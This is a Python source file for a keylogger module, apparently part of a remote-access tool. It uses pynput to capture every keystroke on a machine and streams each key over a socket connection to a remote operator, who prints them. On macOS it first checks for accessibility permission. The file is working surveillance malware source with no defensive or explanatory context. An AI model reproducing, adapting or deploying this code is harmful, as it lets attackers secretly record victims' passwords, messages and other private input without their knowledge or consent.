from pynput.keyboard import Key, Listener
from outputs import Output
import platform

class Keylogger:
	def __init__(self, server):
		self.server = server

	def on_press(self, key):
		self.server.send(str(key))
		status = self.server.recv()
		if status == "STOP":
			return False

	def record(self):
		if platform.system() == 'Darwin':
			import HIServices
			trusted = HIServices.AXIsProcessTrusted()
		else:
			trusted = True

		self.server.send(str(trusted))
		if not trusted:
			return
		with Listener(on_press=self.on_press) as listener :
			listener.join()

	def receive(self):
		if self.server.recv() == "False":
			Output.error("Current application doesn't have permission "
				"to listen to keystrokes.")
			return
		try:
			while True:
				key = self.server.recv()
				print(key)

		except KeyboardInterrupt:
			self.server.send("STOP")
			self.server.recv()
